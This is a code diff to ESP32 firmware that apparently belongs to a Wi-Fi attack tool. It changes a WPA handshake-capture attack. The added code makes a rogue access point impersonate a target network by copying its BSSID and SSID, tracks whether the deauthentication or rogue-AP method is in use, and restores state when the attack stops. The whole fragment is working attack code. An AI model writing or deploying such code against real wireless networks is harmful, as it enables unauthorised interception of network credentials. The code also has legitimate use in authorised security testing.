@@ -14,6 +14,8 @@
 
 static const char *TAG = "main:attack_handshake";
 static esp_timer_handle_t deauth_timer_handle;
+static attack_handshake_methods_t method = -1;
+static uint8_t mac_ap_orig[6];
 static const wifi_ap_record_t *ap_record = NULL;
 
 static void handshake_capture_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
@@ -40,13 +42,15 @@ static void attack_handshake_method_broadcast(){
 
 static void attack_handshake_method_rogueap(){
     ESP_LOGD(TAG, "Configuring Rogue AP");
+    wifictl_get_ap_mac(mac_ap_orig);
+    wifictl_set_ap_mac(ap_record->bssid);
     wifi_config_t ap_config = {
         .ap = {
             .ssid_len = strlen((char *)ap_record->ssid),
             .channel = ap_record->primary,
             .authmode = ap_record->authmode,
             .password = "dummypassword",
-            .max_connection = 0
+            .max_connection = 1
         },
     };
     mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
@@ -55,6 +59,7 @@ static void attack_handshake_method_rogueap(){
 
 void attack_handshake_start(attack_config_t *attack_config){
     ESP_LOGI(TAG, "Starting handshake attack...");
+    method = attack_config->method;
     ap_record = attack_config->ap_record;
     wifictl_sniffer_filter_frame_types(true, false, false);
     wifictl_sniffer_start(ap_record->primary);
@@ -76,17 +81,22 @@ void attack_handshake_start(attack_config_t *attack_config){
 }
 
 void attack_handshake_stop(){
-    switch(attack_config->method){
+    switch(method){
         case ATTACK_HANDSHAKE_METHOD_BROADCAST:
             ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
+            esp_timer_delete(deauth_timer_handle);
             break;
         case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
             wifictl_mgmt_ap_start();
+            wifictl_set_ap_mac(mac_ap_orig);
+            break;
         default:
             ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
     }
     wifictl_sniffer_stop();
     frame_analyzer_capture_stop();
     ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &handshake_capture_handler));
+    ap_record = NULL;
+    method = -1;
     ESP_LOGD(TAG, "Handshake attack stopped");
 }
